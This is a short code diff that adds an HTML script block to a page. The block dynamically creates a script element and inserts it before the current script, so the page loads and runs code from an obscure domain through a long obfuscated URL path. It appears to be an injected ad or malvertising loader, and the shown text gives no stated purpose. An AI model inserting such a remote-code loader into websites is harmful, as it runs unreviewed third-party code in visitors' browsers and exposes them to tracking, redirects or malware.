@@ -1,0 +1,12 @@
+<script>
+(function(uzzxm){
+var d = document,
+    s = d.createElement('script'),
+    l = d.currentScript || d.scripts[d.scripts.length - 1];
+s.settings = uzzxm || {};
+s.src = "\/\/extroverted-election.com\/bAXxV.sqd-GOlM0rYjWlcw\/peDm\/9zurZTU\/lrk_P\/Tjc\/1TNVTVYkxQMkD\/EDtINwz\/Us1rNbj\/Ecw\/NjQB";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
